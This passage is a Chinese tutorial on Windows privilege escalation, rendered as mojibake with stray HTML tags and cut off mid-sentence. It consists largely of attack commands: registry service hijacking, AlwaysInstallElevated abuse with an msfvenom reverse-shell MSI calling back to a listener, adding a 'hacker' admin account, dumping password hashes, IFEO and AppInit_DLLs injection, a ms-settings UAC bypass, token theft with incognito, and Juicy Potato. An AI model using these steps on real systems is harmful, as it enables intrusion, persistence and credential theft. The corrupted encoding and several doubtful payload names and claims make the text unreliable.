â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ v ImagePath t REG_SZ d â€œC:\\malicious.exeâ€ f ä¿®æ”¹åï¼Œé‡æ–°å¯åŠ¨æœåŠ¡ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼š sc stop VulnerableServicesc start VulnerableService 3 AlwaysInstallElevatedAlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†å‘˜ç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œ MSI æ–‡ä»¶çš„è®¾ç½®ã€‚é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹ã€æ³¨å†Œè¡¨é¡¹ï¼Œå¯ä»¥æ£€æŸ¥è¯¥è®¾ç½®æ˜¯å¦å¯ç”¨ï¼š reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\\winPEASany.exe quiet windowscreds æŸ¥çœ‹æ˜¯å¦è®¾ç½®äº†ä¸¤ä¸ªæ³¨å†Œè¡¨å€¼ å¦‚æœè¯¥è®¾ç½®å¯ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œæ¶æ„ MSI æ–‡ä»¶ï¼š msiexec i malicious.msi msf use exploitwindowslocalalways_install_elevated(å…ˆåå¼¹shell) å¦‚æœå¤±è´¥äº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨MSFç”Ÿæˆ msiæ–‡ä»¶ç„¶åä¸Šä¼ ä¸Šå»è¿è¡Œå³å¯ msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.0.106 LPORT6789 -f msi -o payload.msi å»ºç«‹ä¸€ä¸ªæ–°çš„ç›‘å¬(ä¸Šé¢çš„é‚£ä¸ªä¼šè¯ä¸è¦å…³æ‰) å°†msiæ–‡ä»¶é€šè¿‡shellä¼ ä¸Šå» upload payload.msi execute â€œmsiexec.exe quiet qn i payload.msiâ€ åˆ›å»ºä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·é€šè¿‡æ¶æ„ MSI æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ–°ç”¨æˆ·ã€‚ä»¥ä¸‹æ˜¯åˆ›å»ºæ¶æ„ MSI æ–‡ä»¶çš„æ­¥éª¤ï¼š msfvenom -p windowsadduser USERhacker PASSPassword123 -f msi -o adduser.msi æ‰§è¡Œ MSI æ–‡ä»¶åˆ›å»ºæ–°ç”¨æˆ·ï¼š msiexec i adduser.msi è¿™ä¸ªå‘½ä»¤å°†åœ¨ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªåä¸º â€œhackerâ€ çš„ç”¨æˆ·ï¼Œå¹¶èµ‹äºˆç®¡ç†å‘˜æƒé™ã€‚ æå–æ•æ„Ÿä¿¡æ¯æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ª MSI æ–‡ä»¶ï¼Œç”¨äºæå–ç³»ç»Ÿä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç å“ˆå¸Œæˆ–æ³¨å†Œè¡¨é”®å€¼ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š msfvenom -p windowsgatherhashdump -f msi -o hashdump.msi æ‰§è¡Œ MSI æ–‡ä»¶æå–å¯†ç å“ˆå¸Œï¼š msiexec i hashdump.msi è¿™ä¸ªå‘½ä»¤å°†æå–ç³»ç»Ÿä¸­çš„å¯†ç å“ˆå¸Œï¼Œå¹¶å°†å…¶å‘é€åˆ°æŒ‡å®šçš„è¿œç¨‹æœåŠ¡å™¨ã€‚ è¿è¡Œ PowerShell è„šæœ¬æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ MSI æ–‡ä»¶è¿è¡Œå¤æ‚çš„ PowerShell è„šæœ¬ï¼Œä»¥æ‰§è¡Œå¤šæ­¥éª¤çš„æ”»å‡»ã€‚ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªè¿è¡Œ PowerShell è„šæœ¬çš„æ¶æ„ MSI æ–‡ä»¶ï¼š msfvenom -p windowspowershell_exec -f msi -o ps_script.msi CMDâ€powershell -ExecutionPolicy Bypass -File C:\\malicious.ps1â€ æ‰§è¡Œ MSI æ–‡ä»¶è¿è¡Œ PowerShell è„šæœ¬ï¼š msiexec i ps_script.msi è¿™ä¸ªå‘½ä»¤å°†ä»¥ SYSTEM æƒé™è¿è¡ŒæŒ‡å®šçš„ PowerShell è„šæœ¬ã€‚ 4 æ³¨å†Œè¡¨é”®æƒé™æŸäº›æ³¨å†Œè¡¨é”®å¯èƒ½é…ç½®äº†ä¸å®‰å…¨çš„æƒé™ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·ä¿®æ”¹æˆ–åˆ é™¤è¿™äº›é”®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ›´æ”¹ç³»ç»Ÿé…ç½®æˆ–æ¤å…¥æ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š icacls â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ grant Everyone:F ä¿®æ”¹æ³¨å†Œè¡¨é”®åï¼Œé‡æ–°å¯åŠ¨æœåŠ¡æˆ–ç³»ç»Ÿä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ 5 å®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€ï¼ˆSDDLï¼‰æ³¨å†Œè¡¨é¡¹çš„å®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€ï¼ˆSDDLï¼‰å­—ç¬¦ä¸²å®šä¹‰äº†è°å¯ä»¥è®¿é—®è¯¥é¡¹ã€‚æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ SDDL å­—ç¬¦ä¸²ä»¥è·å¾—å¯¹æŸäº›æ³¨å†Œè¡¨é¡¹çš„å®Œå…¨æ§åˆ¶æƒã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ t REG_SZ v â€œSecurityâ€ d â€œD:(A;;GA;;;WD)â€ f æ­¤å‘½ä»¤å°†æ³¨å†Œè¡¨é¡¹çš„æƒé™è®¾ç½®ä¸ºå…è®¸æ‰€æœ‰ç”¨æˆ·å®Œå…¨æ§åˆ¶ã€‚ 6 ç¯å¢ƒå˜é‡åŠ«æŒWindows ç³»ç»Ÿä¸­çš„æŸäº›ç¯å¢ƒå˜é‡å€¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›å€¼æ¥åŠ«æŒç³»ç»Ÿè¡Œä¸ºã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environmentâ€ v â€œPathâ€ t REG_EXPAND_SZ d â€œC:\\malicious;%â€ f æ­¤å‘½ä»¤å°†ç¯å¢ƒå˜é‡ Path ä¿®æ”¹ä¸ºåŒ…å«æ¶æ„è·¯å¾„ï¼Œä»è€ŒåŠ«æŒç³»ç»Ÿä¸­è¿è¡Œçš„ç¨‹åºã€‚ 7 æ³¨å†Œè¡¨é’©å­æ”»å‡»è€…å¯ä»¥åœ¨æ³¨å†Œè¡¨ä¸­æ·»åŠ é’©å­ï¼Œä½¿å¾—å½“æŸäº›æ³¨å†Œè¡¨é¡¹è¢«è®¿é—®æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\target.exeâ€ v â€œDebuggerâ€ t REG_SZ d â€œC:\\malicious.exeâ€ f æ­¤å‘½ä»¤ä¼šä½¿font style=color:rgb(51, 51, 51);target.exe/fontåœ¨æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½å¯åŠ¨font style=color:rgb(51, 51, 51);malicious.exe/fontã€‚ 8 AppInit_DLLs æ³¨å…¥é€šè¿‡ä¿®æ”¹font style=color:rgb(51, 51, 51);AppInit_DLLs/fontæ³¨å†Œè¡¨é¡¹ï¼Œæ”»å‡»è€…å¯ä»¥å°† DLL æ³¨å…¥åˆ°æ‰€æœ‰è¿›ç¨‹ä¸­ï¼Œä»è€Œè·å¾—ç³»ç»Ÿæ§åˆ¶æƒã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windowsâ€ v â€œAppInit_DLLsâ€ t REG_SZ d â€œC:\\malicious.dllâ€ f æ­¤å‘½ä»¤ä¼šåœ¨æ‰€æœ‰è¿›ç¨‹å¯åŠ¨æ—¶åŠ è½½font style=color:rgb(51, 51, 51);malicious.dll/fontã€‚ 9 å¯åŠ¨ä¸æ¢å¤è®¾ç½®æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç³»ç»Ÿçš„å¯åŠ¨ä¸æ¢å¤è®¾ç½®ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿå´©æºƒæ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v AutoReboot /t REG_DWORD /d 0 /freg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v DumpFile /t REG_EXPAND_SZ /d C:\\malicious.dmp /f æ­¤å‘½ä»¤ä¼šå°†ç³»ç»Ÿå´©æºƒåçš„è½¬å‚¨æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸ºæ¶æ„æ–‡ä»¶ã€‚ é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ³¨å†Œè¡¨ä¸­çš„é…ç½®é”™è¯¯å’Œæƒé™æ¼æ´ï¼Œè¿›è¡Œæƒé™æå‡å’Œç³»ç»Ÿæ§åˆ¶ã€‚å®‰å…¨äººå‘˜åº”ç‰¹åˆ«æ³¨æ„æ³¨å†Œè¡¨çš„é…ç½®å’Œæƒé™ç®¡ç†ï¼Œä»¥é˜²èŒƒæ½œåœ¨çš„æ”»å‡»ã€‚ ç»„ç­–ç•¥ç»„ç­–ç•¥é¦–é€‰é¡¹postwindowsgathercredentialsgpp ç»•è¿‡UACå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚å¦‚æœç®¡ç†å‘˜ä¸å…è®¸æ›´æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œè¿™äº›æ›´æ”¹ï¼Œå¹¶ä¸”Windowsç³»ç»Ÿä¿æŒä¸å˜ã€‚ ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰ åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº DLLæ³¨å…¥ ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰ ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰ ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰ è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰ 1.ç™½åå•ä»€ä¹ˆæ˜¯UACç™½åå•ï¼Ÿæ“ä½œç³»ç»Ÿè‡ªå·±æœ‰ä¸€äº›è¿›ç¨‹åœ¨è¿è¡Œçš„æ—¶å€™ä¸éœ€è¦é€šè¿‡éªŒè¯å°±ç›´æ¥å¯ä»¥è¿è¡Œï¼Œè¿™äº›ç¨‹åºåœ¨UACç™½åå•ä¸­ï¼Œæ¯”å¦‚ï¼šslui.exe.taskmgr.exeç­‰ã€‚ å½“è¿™äº›ç¨‹åºè¿è¡Œçš„æ—¶å€™å¯ä»¥é€šè¿‡DLLåŠ«æŒï¼ŒDLLæ³¨å…¥æˆ–è€…æ³¨å†Œè¡¨åŠ«æŒç­‰ ç»•è¿‡DLLå»æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºã€‚ è¿™é‡Œä¸¾ä¾‹æ³¨å†Œè¡¨åŠ«æŒï¼š é¦–å…ˆä½¿ç”¨å·¥å…·æ‰¾å‡ºç™½åå•çš„ç¨‹åºã€‚åœ¨UACç™½åå•ä¸­çš„ç¨‹åºéƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯Mainfestæ•°æ®ä¸­çš„autoElevateå±æ€§çš„å€¼ä¸ºTrueã€‚ strings.exe å¯ä»¥æ£€æµ‹ç¨‹åºæ˜¯å¦æœ‰autoElevate å±æ€§ï¼Œä»è€Œæ‰¾å‡ºç™½åå•çš„ç¨‹åºï¼š strings.exe /accepteula -s C:\\windows\\system32\\*.exe | findstr /i aotoElevate å‡å¦‚ComputerDefaults.exe è¿›ç¨‹ï¼š æ‰“å¼€è¿™ä¸ªexe,æ²¡æœ‰éªŒè¯ç›´æ¥è¿›å…¥é»˜è®¤åº”ç”¨ç•Œé¢ã€‚ é€šè¿‡è¿›ç¨‹ç›‘æ§ åˆ†æè¯¥è¿›ç¨‹ä¼šå‘ç°ï¼Œå®ƒä¼šå…ˆå»è®¿é—®HKCU\\Software\\Classes\\ms-settings\\shell\\open\\commandï¼Œå‘ç°æ²¡ä¸œè¥¿åå†å»è®¿é—® HKCR\\ms-settings\\Shell\\Open\\Command\\DelegateExecute. ç„¶åæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒHKCU\\Software\\Classes\\ms-settings\\shell\\open\\command ä¸­çš„é»˜è®¤å€¼å’Œ DelegateExecute reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\windows\\system32\\cmd.exe #å¯ä»¥æ˜¯æ”»å‡»è½½è·çš„è·¯å¾„ã€‚reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d C:\\windows\\system32\\cmd.exe 2.DDLåŠ«æŒä»€ä¹ˆæ˜¯DLLåŠ«æŒï¼Œç¨‹åºé€šå¸¸å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¢«åˆ†å‰²æˆä¸€äº›DLLæ–‡ä»¶ã€‚å½“åº”ç”¨ç¨‹åºåŠ è½½DLLæ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šDLLçš„ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šä»¥ç‰¹å®šçš„é¡ºåºå»éå†æœç´¢åŠ è½½çš„DLLï¼Œå¦‚æœå°†åŒåçš„æ¶æ„çš„DLLæ–‡ä»¶æ”¾åœ¨çœŸæ­£çš„DLLä¹‹å‰ï¼Œé‚£ä¹ˆå°±ä¼šè¢«åŠ«æŒã€‚è¿™å°±æ˜¯åŠ«æŒã€‚ ä½†æ˜¯è¿™å‰ææ˜¯è¿™ä¸ªéå†ç›®å½•å¯å†™ã€‚è¿™ä¸ªç›®å½•é€šå¸¸åˆä¸å¯å†™ã€‚æ‰€ä»¥è¿™ä¸ªæŠ€æœ¯é€šå¸¸å’Œæ¨¡æ‹Ÿå¯ä¿¡ä»»æŠ€æœ¯æ¥é…åˆä½¿ç”¨ã€‚ æ‰€ä»¥æå‡ºä¸‹é¢è¿™ä¸ª æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½• 3.æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¹‹å‰è¯´äº†UACç™½åå•ä¸­çš„ç¨‹åºçš„manifest æ•°æ®ä¸­çš„autoElevateä¸ºtrueï¼Œå½“æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸ä½†è¦æ£€æŸ¥è¿™ä¸ªæ¡ä»¶ï¼Œè¿˜è¦æ£€æŸ¥è¿™ä¸ªç¨‹åºæ˜¯å¦åœ¨å¯ä¿¡ä»»ç›®å½•Cï¼š\\windows\\system32ä¸­ã€‚ä¸¤è€…ç¼ºä¸€ä¸å¯ã€‚ä½†æ˜¯å½“ç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œä¼šè‡ªåŠ¨å»é™¤è·¯å¾„ä¸­çš„ç©ºæ ¼ã€‚æ¯”å¦‚ â€C:\\Windows \\system32â€ ä¼šè¢«è§£ææˆ â€œC:\\windows\\system32â€ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªâ€C:\\Windows \\system32â€ç›®å½•ï¼ŒæŠŠç™½åå•ä¸­çš„ç¨‹åºå¤åˆ¶è¿›è¿™ä¸ªå«ç©ºæ ¼çš„ç›®å½•ä¸­ã€‚å†æŠŠæ¶æ„DLLæ–‡ä»¶æ”¾åˆ°è¿™ä¸ªæ¨¡æ‹Ÿçš„å¯ä¿¡ä»»ç›®å½•ä¸­ã€‚ç„¶åè¿è¡Œè¿™ä¸ªæ¨¡æ‹Ÿç›®å½•ä¸­çš„å¯æ‰§è¡Œç¨‹åºã€‚å°±ä¼šè¾¾åˆ°ç»•è¿‡UAC DLLåŠ«æŒææƒçš„æ•ˆæœã€‚ md \\\\?\\C:\\Windows md \\\\?\\C:\\Windows \\System32copy C:\\Windows\\System32\\winSTA.exe C:\\Windows \\System32\\winSAT.exe ä½†æ˜¯åˆ¶ä½œDLLçš„æ—¶å€™ï¼Œè¦æ³¨æ„æ¶æ„DLLçš„å¯¼å‡ºå‡½æ•°è¦ä¸è¢«åŠ«æŒçš„DLLä¸€æ ·ã€‚ ä¸“ä¸šåè¯è§£é‡Šï¼šDelegateExecute æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ª COM (Component Object Model) æ¥å£ï¼Œå®ƒé€šå¸¸ä¸åº”ç”¨ç¨‹åºæ‰©å±•å’Œå¤–éƒ¨å¤„ç†ç¨‹åºç›¸å…³ã€‚DelegateExecute æ¥å£å…è®¸ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–ç»„ä»¶å°†æŸäº›ä»»åŠ¡å§”æ‰˜ç»™å…¶ä»–ç¨‹åºæˆ–å¤„ç†ç¨‹åºæ¥æ‰§è¡Œï¼Œé€šå¸¸æ˜¯ä¸ºäº†å¢å¼ºåŠŸèƒ½æˆ–å®ç°æŸç§å®šåˆ¶åŒ–çš„è¡Œä¸ºã€‚ Manifest æ•°æ®æŒ‡çš„æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¸…å•ï¼ˆApplication Manifestï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨äºæè¿°åº”ç”¨ç¨‹åºç‰¹æ€§ã€ä¾èµ–å…³ç³»ã€æƒé™è¦æ±‚ä»¥åŠå…¶ä»–å…ƒæ•°æ®çš„ XML æ–‡ä»¶ã€‚åº”ç”¨ç¨‹åºæ¸…å•é€šå¸¸é™„åŠ åˆ°åº”ç”¨ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .exe æ–‡ä»¶ï¼‰æˆ–åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰ä¸­ï¼Œä»¥ä¾¿æ“ä½œç³»ç»Ÿå’Œå…¶ä»–ç¨‹åºèƒ½å¤Ÿæ­£ç¡®åœ°è¯†åˆ«å’Œä¸åº”ç”¨ç¨‹åºäº’åŠ¨ã€‚ 4.MSFä¸‹çš„Bypassexploitwindowslocalask #å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç‚¹å‡»åè·å¾—systemæƒé™ exploitwindowslocalbypassuac #è¯¥æ¨¡å—è¿è¡Œæ—¶ä¼šå› ä¸ºåœ¨ç›®æ ‡æœºä¸Šåˆ›å»ºå¤šä¸ªæ–‡ä»¶è€Œè¢«æ€æ¯’è½¯ä»¶è¯†åˆ«ï¼Œå› æ­¤é€šè¿‡è¯¥æ¨¡å—ææƒæˆåŠŸç‡å¾ˆä½ã€‚ exploitwindowslocalbypassuac_injection #è¯¥æ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„DLLä¸­ï¼Œæ‰€ä»¥ä¸ä¼šæ¥è§¦ç›®æ ‡æœºå™¨çš„ç¡¬ç›˜ï¼Œä»è€Œé™ä½äº†è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡ã€‚ exploitwindowslocalbypassuac_fodhelper exploitwindowslocalbypassuac_eventvwr exploitwindowslocalbypassuac_comhijack ä»¤ç‰Œçªƒå–ä»€ä¹ˆæ˜¯ä»¤ç‰Œ ä»¤ç‰Œ(token)æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶ç§˜é’¥ï¼Œç›¸å½“äºè´¦å·å’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºï¼Œè¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ã€‚ä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œé»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºä»¤ç‰Œã€‚ å¯ä»¥é€šè¿‡æ“ä½œä¸€ä¸ªé«˜æƒé™è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œæ¥ å½“åšä¸€ä¸ªè¿›ç¨‹çš„ä»¤ç‰Œã€‚å°±æ˜¯è¯´å·å…¶ä»–è¿›ç¨‹çš„ä»¤ç‰Œæ¥ç”¨ã€‚ç„¶åå°±å¯ä»¥æ‹¥æœ‰é‚£ä¸ªä»¤ç‰Œè‡ªèº«æ‹¥æœ‰çš„æƒé™ã€‚ èƒ½å·å…¶ä»–è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œçš„æ¡ä»¶ï¼šè¯¥ç”¨æˆ·å¿…é¡»æœ‰SeImpersonatePrivilege å’ŒSeAssignPrimaryTokenPrivilegeSeIncreaseQuotaPrivilegeæƒé™ã€‚è€Œè¿™ä¸¤ä¸ªæƒé™çš„ç”¨æˆ·é€šå¸¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ï¼ŒwebæœåŠ¡è´¦æˆ·ï¼Œå’ŒIIs MsSQLè´¦æˆ·ç­‰ã€‚ 1.ç›´æ¥å·****ä½¿ç”¨incognnito.exeã€‚ä¸Šä¼ åˆ°ä¸»æœºã€‚ incognito.exe list_tokens -u #åˆ—ä¸¾å½“å‰ä¸»æœºä¸Šçš„æ‰€æœ‰è®¿é—®ä»¤ç‰Œincognito.exe execute -c NT AUTHORITY\\SYSTEM whoami#-c å·ä»¤ç‰Œï¼Œwhoami å·å®Œåæ‰§è¡Œçš„å‘½ä»¤incognito.exe execute -c travel-me\\Bob cmdå·åŸŸä¸‹Bobçš„ä»¤ç‰Œï¼Œç„¶åæ‰§è¡Œå®ƒçš„ã€‚ä¹Ÿå°±æ˜¯åˆ‡æ¢åˆ°Bobçš„ç”¨æˆ·ã€‚ 2.MSFå·#msf æ‹¿åˆ°ä¸€ä¸ªä¼šè¯ use incognito #è¿›å…¥incognitoæ¨¡å— list_tokens -u #åˆ—å‡ºä»¤ç‰Œ Delegation Tokenï¼šä¹Ÿå°±æ˜¯æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•(ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®) Impresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯ã€‚ è¿™é‡Œçªƒå–ä»¤ç‰Œï¼Œä¸»è¦æ˜¯çªƒå–è¿›ç¨‹ä¸­çš„ä»¤ç‰Œ #ä½¿ç”¨ä»¤ç‰Œå‡å†’ç”¨æˆ· impresonate_Token â€œä»¤ç‰Œåâ€ incognitoï¼šexemsfå‡å¯ï¼Œmsfä¸­çš„incognitoæ˜¯ä»windowsä¸­çš„exeæ–‡ä»¶ä¸­ç§»æ¤è¿‡å»çš„ï¼Œè¿™é‡Œä»¥msfè‡ªå¸¦çš„incognitoä¸ºä¾‹ã€‚ é¦–å…ˆæˆ‘ä»¬è¿›å…¥ä¹‹å‰è·å–çš„meterpreter msf5 session 3 meterpreter load incognito åŠ è½½incognitoï¼ˆé™¤äº†incognitoå¤–è¿˜å¯ä»¥åŠ è½½å…¶ä»–æ’ä»¶æ¯”å¦‚mimikatzï¼Œæˆ‘ä»¬ä¹‹åä¼šç”¨åˆ°ï¼‰ meterpreter getuid æŸ¥çœ‹å½“å‰token meterpreter list_tokens -u åˆ—å‡ºå¯ç”¨token meterpreter impersonate_token â€œNT AUTHORITY\\SYSTEMâ€tokençªƒå–ï¼Œæ ¼å¼ä¸ºimpersonate_tokenâ€ä¸»æœºå\\ç”¨æˆ·åâ€ meterpreter getuid æŸ¥çœ‹å½“å‰token meterpreter rev2self è¿”å›ä¹‹å‰çš„token 3.PotatoææƒHot PotatoJuicy Potato.ä»€ä¹ˆæ˜¯ BITS å’Œ CLSIDï¼Ÿ CLSIDæ˜¯æ ‡è¯† COM ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼UUIDçš„æ ‡è¯†ç¬¦ã€‚ ç¨‹åºå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡ (BITS)ä» HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ä¸‹è½½æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ åˆ° HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ã€‚å…³é”®æ˜¯BITå®ç°äº†IMarshalæ¥å£å¹¶å…è®¸ä»£ç†å£°æ˜å¼ºåˆ¶ NTLM èº«ä»½éªŒè¯ã€‚ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md(CLSID) whoami all whoami priv å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨ -t t å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨ -t u å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t * å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒ è¿™äº›å› ç´ ç›´æ¥å½±å“ä½ èƒ½å¦æ‰¾åˆ°å¯ç”¨çš„ CLSIDï¼Œæ˜¯æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ä¸­çš„å…³é”®ç¯èŠ‚ã€‚ ä¸€ä¸ªæœ‰æ•ˆçš„ CLSID è¿™æ˜¯å®é™…æ“ä½œä¸­æœ€å…·æŒ‘æˆ˜æ€§çš„éƒ¨åˆ†ã€‚ä½ éœ€è¦ä¸ºç‰¹å®šç‰¹å®šç‰ˆæœ¬çš„ Windows ç³»ç»Ÿæ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„ CLSIDã€‚ Juicy Potato å‘å¸ƒæ—¶é™„å¸¦äº†ä¸€ä¸ª font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 